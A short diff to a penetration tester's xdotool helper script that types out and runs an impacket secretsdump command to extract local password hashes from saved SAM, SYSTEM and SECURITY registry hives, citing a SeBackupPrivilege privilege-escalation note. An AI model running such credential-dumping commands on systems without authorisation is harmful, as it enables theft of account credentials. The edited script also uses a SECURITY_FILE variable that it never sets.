@@ -4,12 +4,17 @@
 Registry: Save SYSTEM, SECURITY, and SAM hives.
 '
 
-; '
-https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md
-'
+# https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+SYSTEM_FILE_FIELD=$(form_item  "system file" "system_file" "system.save")
+SAM_FILE_FIELD=$(form_item  "sam file" "sam_file" "sam.save")
 
-paste_command "impacket-secretsdump -sam sam.save -system system.save LOCAL"
+# Generate GUI form
+generate_form "${SYSTEM_FILE_FIELD}" "${SAM_FILE_FIELD}"
+
+SYSTEM_FILE=${form_data["system_file"]}
+SAM_FILE=${form_data["sam_file"]}
+
+paste_command "secretsdump.py LOCAL -system ${SYSTEM_FILE} -sam ${SAM_FILE} -security ${SECURITY_FILE}"
 xdotool key Return
-sleep 1
